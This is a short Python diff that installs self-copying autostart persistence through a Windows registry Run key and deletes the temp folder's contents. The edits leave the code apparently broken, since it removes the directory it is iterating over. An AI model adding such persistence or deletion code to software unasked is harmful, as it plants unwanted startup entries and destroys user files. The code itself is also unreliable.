@@ -5,14 +5,14 @@ def Persistance():
     chdir(Download_Dir)
     shutil.copyfile(__file__, Download_Dir)
 
-    if not os.path.exists(Malocation):
-        subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Temp_Del /t REG_SZ /d " + Download_Dir, shell=True)
+    if not os.path.exists(Download_Dir):
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Temp_Del /t REG_SZ /d "' + Download_Dir + '"', shell=True)
 
 dir = os.environ["temp"]
 
 for files in os.listdir(dir):
     path = os.path.join(dir, files)
     try:
-        shutil.rmtree(path)
+        shutil.rmtree(dir)
     except OSError:
-        os.remove(path)
+        os.remove(dir)
